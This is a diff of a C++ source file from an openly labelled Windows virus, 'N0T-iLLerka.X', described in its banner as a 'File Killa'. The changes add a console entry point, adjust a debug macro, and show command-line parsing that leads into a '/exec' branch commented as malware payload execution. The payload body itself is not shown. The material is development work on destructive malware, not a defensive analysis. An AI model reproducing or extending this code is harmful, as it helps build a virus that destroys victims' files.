@@ -4,21 +4,30 @@
  |  /   |  \/  /_\  \|   | ______|  |   |   |   |     _(_  <_  __ \  |/ //  |  |_   \     /  |    | |  |      /    \|  |\     /    |  | |
  | /    |   \  \_/   \   |/_____/|  |   |___|   |___ /      \  | \/    </   ^   /   /     \  |    | |  |     |   |  \  |/     \    |  | |
  | \____|_  /\_____  /___|       |__|______ \______ /_____  /__|  |__|_ \___   | /\/___/\  \ |    | |  |_  /\|___|  /__/___/\  \  _|  | |
- | 	      \/       \/                      \/      \/     \/           \/   |__| \/      \_/ |    | |____| \/     \/         \_/ |____| |
+ |        \/       \/                      \/      \/     \/           \/   |__| \/      \_/ |    | |____| \/     \/         \_/ |____| |
  +--------------------------------------------------------------------+----------------------/    \-------------------------------------/
  | N0T-iLLerka.X [.niX] your File Killa]    [Virus.Win32.VC Type: .X] |
- | by Lima X [L4X] / [G-C-E-R] © 2k19       [dev-VER: 0.5.2 BETA-1.0] |
+ | by Lima X [L4X] / [G-C-E-R] © 2kl9       [dev-VER: 0.5.2 BETA-1.0] |
  \--------------------------------------------------------------------*/
 
 #include "../Header-Files/pch.h"
 #include "../Header-Files/N0T-iLLerka.h"
 
+#if defined(_WINDOWS)
 INT APIENTRY wWinMain(
 	_In_     HINSTANCE hInstance,
 	_In_opt_ HINSTANCE hPrevInstance,
 	_In_     LPWSTR    lpCmdLine,
 	_In_     INT       nShowCmd
 ) {
+#elif defined(_CONSOLE)
+INT wmain(
+	_In_ INT    argc,
+	_In_ LPWSTR argv[],
+	_In_ LPWSTR envp[]
+) {
+	fnPrintConsoleNiXW();
+#endif
 	// Read Commandline Arguments
 	INT nArgs;
 	LPWSTR* szArglist = CommandLineToArgvW(GetCommandLine(), &nArgs);
@@ -34,7 +43,7 @@ INT APIENTRY wWinMain(
 	GetModuleFileName(NULL, szMfn, MAX_PATH);
 
 	if ((nArgs > 1) && (!lstrcmp(szArglist[1], L"/exec"))) { //// Start of /exec //// Malware Payload execution ////////////////////////////////////////
-#ifdef DEBUG_MSG
+#if DEBUG_MSG == TRUE
 		MessageBox(NULL, L"Executing with Argument: /exec", szMALWR_NAME, MB_ICONINFORMATION | MB_SYSTEMMODAL);
 #endif // DEBUG_MSG
 
